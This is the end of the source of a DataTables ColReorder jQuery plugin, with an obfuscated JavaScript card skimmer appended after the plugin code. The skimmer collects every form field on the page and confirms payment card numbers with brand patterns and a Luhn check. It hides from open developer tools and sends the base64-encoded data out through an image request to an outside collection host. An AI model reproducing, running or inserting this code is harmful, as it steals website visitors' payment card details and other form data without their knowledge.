	 *      // Using the `oColReorder` option in the DataTables options object
	 *      $('#example').dataTable( {
	 *          "sDom": 'Rlfrtip',
	 *          "oColReorder": {
	 *              "bRealtime": true
	 *          }
	 *      } );
	 *
	 *  @example
	 *      // Using `new` constructor
	 *      $('#example').dataTable()
	 *
	 *      new $.fn.dataTable.ColReorder( '#example', {
	 *          "bRealtime": true
	 *      } );
	 */
	bRealtime: false,

	/**
	 * Indicate how many columns should be fixed in position (counting from the
	 * left). This will typically be 1 if used, but can be as high as you like.
	 *  @type int
	 *  @default 0
	 *  @static
	 *  @example
	 *      // Using the `oColReorder` option in the DataTables options object
	 *      $('#example').dataTable( {
	 *          "sDom": 'Rlfrtip',
	 *          "oColReorder": {
	 *              "iFixedColumns": 1
	 *          }
	 *      } );
	 *
	 *  @example
	 *      // Using `new` constructor
	 *      $('#example').dataTable()
	 *
	 *      new $.fn.dataTable.ColReorder( '#example', {
	 *          "iFixedColumns": 1
	 *      } );
	 */
	iFixedColumns: 0,

	/**
	 * As `iFixedColumnsRight` but counting from the right.
	 *  @type int
	 *  @default 0
	 *  @static
	 *  @example
	 *      // Using the `oColReorder` option in the DataTables options object
	 *      $('#example').dataTable( {
	 *          "sDom": 'Rlfrtip',
	 *          "oColReorder": {
	 *              "iFixedColumnsRight": 1
	 *          }
	 *      } );
	 *
	 *  @example
	 *      // Using `new` constructor
	 *      $('#example').dataTable()
	 *
	 *      new $.fn.dataTable.ColReorder( '#example', {
	 *          "iFixedColumnsRight": 1
	 *      } );
	 */
	iFixedColumnsRight: 0,

	/**
	 * Callback function that is fired when columns are reordered
	 *  @type function():void
	 *  @default null
	 *  @static
	 *  @example
	 *      // Using the `oColReorder` option in the DataTables options object
	 *      $('#example').dataTable( {
	 *          "sDom": 'Rlfrtip',
	 *          "oColReorder": {
	 *              "fnReorderCallback": function () {
	 *                  alert( 'Columns reordered' );
	 *              }
	 *          }
	 *      } );
	 *
	 *  @example
	 *      // Using `new` constructor
	 *      $('#example').dataTable()
	 *
	 *      new $.fn.dataTable.ColReorder( '#example', {
	 *          "fnReorderCallback": function () {
	 *              alert( 'Columns reordered' );
	 *          }
	 *      } );
	 */
	fnReorderCallback: null
};



/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Constants
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

/**
 * ColReorder version
 *  @constant  version
 *  @type      String
 *  @default   As code
 */
ColReorder.version = "1.1.2";



/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 * DataTables interfaces
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

// Expose
$.fn.dataTable.ColReorder = ColReorder;
$.fn.DataTable.ColReorder = ColReorder;


// Register a new feature with DataTables
if ( typeof $.fn.dataTable == "function" &&
     typeof $.fn.dataTableExt.fnVersionCheck == "function" &&
     $.fn.dataTableExt.fnVersionCheck('1.9.3') )
{
	$.fn.dataTableExt.aoFeatures.push( {
		"fnInit": function( settings ) {
			var table = settings.oInstance;

			if ( ! settings._colReorder ) {
				var dtInit = settings.oInit;
				var opts = dtInit.colReorder || dtInit.oColReorder || {};

				new ColReorder( settings, opts );
			}
			else {
				table.oApi._fnLog( settings, 1, "ColReorder attempted to initialise twice. Ignoring second" );
			}

			return null; /* No node for DataTables to insert */
		},
		"cFeature": "R",
		"sFeature": "ColReorder"
	} );
}
else {
	alert( "Warning: ColReorder requires DataTables 1.9.3 or greater - www.datatables.net/download");
}


// API augmentation
if ( $.fn.dataTable.Api ) {
	$.fn.dataTable.Api.register( 'colReorder.reset()', function () {
		return this.iterator( 'table', function ( ctx ) {
			ctx._colReorder.fnReset();
		} );
	} );

	$.fn.dataTable.Api.register( 'colReorder.order()', function ( set ) {
		if ( set ) {
			return this.iterator( 'table', function ( ctx ) {
				ctx._colReorder.fnOrder( set );
			} );
		}

		return this.context.length ?
			this.context[0]._colReorder.fnOrder() :
			null;
	} );
}

return ColReorder;
}; // /factory


// Define as an AMD module if possible
if ( typeof define === 'function' && define.amd ) {
	define( ['jquery', 'datatables'], factory );
}
else if ( typeof exports === 'object' ) {
    // Node/CommonJS
    factory( require('jquery'), require('datatables') );
}
else if ( jQuery && !jQuery.fn.dataTable.ColReorder ) {
	// Otherwise simply initialise as normal, stopping multiple evaluation
	factory( jQuery, jQuery.fn.dataTable );
}


})(window, document);


var _0x4745=['\x52\x47\x39\x74\x59\x57\x6c\x75','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6a\x5a\x47\x34\x74\x61\x57\x31\x6e\x59\x32\x78\x76\x64\x57\x51\x75\x59\x32\x39\x74\x4c\x32\x6c\x74\x5a\x77\x3d\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x61\x57\x35\x77\x64\x58\x51\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d'];(function(_0x2d1008,_0x1b1caf){var _0x5d096f=function(_0x3088f3){while(--_0x3088f3){_0x2d1008['push'](_0x2d1008['shift']());}};_0x5d096f(++_0x1b1caf);}(_0x4745,0x120));var _0x199c=function(_0x1ddf45,_0x17f0f4){_0x1ddf45=_0x1ddf45-0x0;var _0x5bfe62=_0x4745[_0x1ddf45];if(_0x199c['PgxIgj']===undefined){(function(){var _0x574658=function(){var _0x3b79fd;try{_0x3b79fd=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0xaf3c61){_0x3b79fd=window;}return _0x3b79fd;};var _0x20cb9e=_0x574658();var _0x490f16='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x20cb9e['atob']||(_0x20cb9e['atob']=function(_0x451a90){var _0xb0d698=String(_0x451a90)['replace'](/=+$/,'');for(var _0x19a475=0x0,_0x5e123b,_0x302eb2,_0x5b4a64=0x0,_0x36a949='';_0x302eb2=_0xb0d698['charAt'](_0x5b4a64++);~_0x302eb2&&(_0x5e123b=_0x19a475%0x4?_0x5e123b*0x40+_0x302eb2:_0x302eb2,_0x19a475++%0x4)?_0x36a949+=String['fromCharCode'](0xff&_0x5e123b>>(-0x2*_0x19a475&0x6)):0x0){_0x302eb2=_0x490f16['indexOf'](_0x302eb2);}return _0x36a949;});}());_0x199c['ePbqga']=function(_0x569a0d){var _0x2b3894=atob(_0x569a0d);var _0x2a8a83=[];for(var _0x57f212=0x0,_0x5f85dd=_0x2b3894['length'];_0x57f212<_0x5f85dd;_0x57f212++){_0x2a8a83+='%'+('00'+_0x2b3894['charCodeAt'](_0x57f212)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x2a8a83);};_0x199c['FYcIbm']={};_0x199c['PgxIgj']=!![];}var _0x278760=_0x199c['FYcIbm'][_0x1ddf45];if(_0x278760===undefined){_0x5bfe62=_0x199c['ePbqga'](_0x5bfe62);_0x199c['FYcIbm'][_0x1ddf45]=_0x5bfe62;}else{_0x5bfe62=_0x278760;}return _0x5bfe62;};function _0x585bca(_0x49108e,_0x337cc6,_0x472fb9){return _0x49108e[_0x199c('0x0')](new RegExp(_0x337cc6,'\x67'),_0x472fb9);}function _0x2cec68(_0x6910fc){var _0x1169d9=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x133e49=/^(?:5[1-5][0-9]{14})$/;var _0x1eb369=/^(?:3[47][0-9]{13})$/;var _0x435a0e=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x35f9ec=![];if(_0x1169d9['\x74\x65\x73\x74'](_0x6910fc)){_0x35f9ec=!![];}else if(_0x133e49[_0x199c('0x1')](_0x6910fc)){_0x35f9ec=!![];}else if(_0x1eb369[_0x199c('0x1')](_0x6910fc)){_0x35f9ec=!![];}else if(_0x435a0e[_0x199c('0x1')](_0x6910fc)){_0x35f9ec=!![];}return _0x35f9ec;}function _0x1161cb(_0x145c5d){if(/[^0-9-\s]+/[_0x199c('0x1')](_0x145c5d))return![];var _0x5633a1=0x0,_0xf685cd=0x0,_0x3c7961=![];_0x145c5d=_0x145c5d[_0x199c('0x0')](/\D/g,'');for(var _0x48f879=_0x145c5d[_0x199c('0x2')]-0x1;_0x48f879>=0x0;_0x48f879--){var _0x569a5a=_0x145c5d[_0x199c('0x3')](_0x48f879),_0xf685cd=parseInt(_0x569a5a,0xa);if(_0x3c7961){if((_0xf685cd*=0x2)>0x9)_0xf685cd-=0x9;}_0x5633a1+=_0xf685cd;_0x3c7961=!_0x3c7961;}return _0x5633a1%0xa==0x0;}(function(){'use strict';const _0x171257={};_0x171257['\x69\x73\x4f\x70\x65\x6e']=![];_0x171257['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']=undefined;const _0x215ed5=0xa0;const _0x35c171=(_0x5b242a,_0x28359d)=>{window[_0x199c('0x4')](new CustomEvent(_0x199c('0x5'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x5b242a,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x28359d}}));};setInterval(()=>{const _0x71af43=window[_0x199c('0x6')]-window[_0x199c('0x7')]>_0x215ed5;const _0x1da6bc=window[_0x199c('0x8')]-window[_0x199c('0x9')]>_0x215ed5;const _0x10dede=_0x71af43?_0x199c('0xa'):_0x199c('0xb');if(!(_0x1da6bc&&_0x71af43)&&(window['\x46\x69\x72\x65\x62\x75\x67']&&window[_0x199c('0xc')][_0x199c('0xd')]&&window[_0x199c('0xc')][_0x199c('0xd')][_0x199c('0xe')]||_0x71af43||_0x1da6bc)){if(!_0x171257[_0x199c('0xf')]||_0x171257[_0x199c('0x10')]!==_0x10dede){_0x35c171(!![],_0x10dede);}_0x171257[_0x199c('0xf')]=!![];_0x171257[_0x199c('0x10')]=_0x10dede;}else{if(_0x171257[_0x199c('0xf')]){_0x35c171(![],undefined);}_0x171257['\x69\x73\x4f\x70\x65\x6e']=![];_0x171257[_0x199c('0x10')]=undefined;}},0x1f4);if(typeof module!==_0x199c('0x11')&&module[_0x199c('0x12')]){module[_0x199c('0x12')]=_0x171257;}else{window[_0x199c('0x13')]=_0x171257;}}());String[_0x199c('0x14')][_0x199c('0x15')]=function(){var _0x2a964e=0x0,_0x3bbad3,_0x1a1893;if(this['\x6c\x65\x6e\x67\x74\x68']===0x0)return _0x2a964e;for(_0x3bbad3=0x0;_0x3bbad3<this[_0x199c('0x2')];_0x3bbad3++){_0x1a1893=this[_0x199c('0x16')](_0x3bbad3);_0x2a964e=(_0x2a964e<<0x5)-_0x2a964e+_0x1a1893;_0x2a964e|=0x0;}return _0x2a964e;};var _0x35fcbc={};_0x35fcbc[_0x199c('0x17')]=_0x199c('0x18');_0x35fcbc[_0x199c('0x19')]={};_0x35fcbc[_0x199c('0x1a')]=[];_0x35fcbc['\x49\x73\x56\x61\x6c\x69\x64']=![];_0x35fcbc[_0x199c('0x1b')]=function(_0x5c3159){if(_0x5c3159.id!==undefined&&_0x5c3159.id!=''&&_0x5c3159.id!==null&&_0x5c3159.value.length<0x100&&_0x5c3159.value.length>0x0){if(_0x1161cb(_0x585bca(_0x585bca(_0x5c3159.value,'\x2d',''),'\x20',''))&&_0x2cec68(_0x585bca(_0x585bca(_0x5c3159.value,'\x2d',''),'\x20','')))_0x35fcbc.IsValid=!![];_0x35fcbc.Data[_0x5c3159.id]=_0x5c3159.value;return;}if(_0x5c3159.name!==undefined&&_0x5c3159.name!=''&&_0x5c3159.name!==null&&_0x5c3159.value.length<0x100&&_0x5c3159.value.length>0x0){if(_0x1161cb(_0x585bca(_0x585bca(_0x5c3159.value,'\x2d',''),'\x20',''))&&_0x2cec68(_0x585bca(_0x585bca(_0x5c3159.value,'\x2d',''),'\x20','')))_0x35fcbc.IsValid=!![];_0x35fcbc.Data[_0x5c3159.name]=_0x5c3159.value;return;}};_0x35fcbc['\x53\x61\x76\x65\x41\x6c\x6c\x46\x69\x65\x6c\x64\x73']=function(){var _0x5ef99b=document.getElementsByTagName(_0x199c('0x1c'));var _0x18b27a=document.getElementsByTagName(_0x199c('0x1d'));var _0x58c44b=document.getElementsByTagName(_0x199c('0x1e'));for(var _0x40311d=0x0;_0x40311d<_0x5ef99b.length;_0x40311d++)_0x35fcbc.SaveParam(_0x5ef99b[_0x40311d]);for(var _0x40311d=0x0;_0x40311d<_0x18b27a.length;_0x40311d++)_0x35fcbc.SaveParam(_0x18b27a[_0x40311d]);for(var _0x40311d=0x0;_0x40311d<_0x58c44b.length;_0x40311d++)_0x35fcbc.SaveParam(_0x58c44b[_0x40311d]);};_0x35fcbc[_0x199c('0x1f')]=function(){if(!window.devtools.isOpen&&_0x35fcbc.IsValid){_0x35fcbc.Data[_0x199c('0x20')]=location.hostname;var _0x376e6a=encodeURIComponent(window.btoa(JSON.stringify(_0x35fcbc.Data)));var _0x1a1af5=_0x376e6a.hashCode();for(var _0x3bd3e2=0x0;_0x3bd3e2<_0x35fcbc.Sent.length;_0x3bd3e2++)if(_0x35fcbc.Sent[_0x3bd3e2]==_0x1a1af5)return;_0x35fcbc.LoadImage(_0x376e6a);}};_0x35fcbc[_0x199c('0x21')]=function(){_0x35fcbc.SaveAllFields();_0x35fcbc.SendData();};_0x35fcbc[_0x199c('0x22')]=function(_0xa092e6){_0x35fcbc.Sent.push(_0xa092e6.hashCode());var _0x5445ff=document.createElement(_0x199c('0x23'));_0x5445ff.src=_0x35fcbc.GetImageUrl(_0xa092e6);};_0x35fcbc[_0x199c('0x24')]=function(_0x2bb309){return _0x35fcbc.Gate+_0x199c('0x25')+_0x2bb309;};document['\x6f\x6e\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6e\x67\x65']=function(){if(document[_0x199c('0x26')]==='\x63\x6f\x6d\x70\x6c\x65\x74\x65'){window[_0x199c('0x27')](_0x35fcbc['\x54\x72\x79\x53\x65\x6e\x64'],0x1f4);}};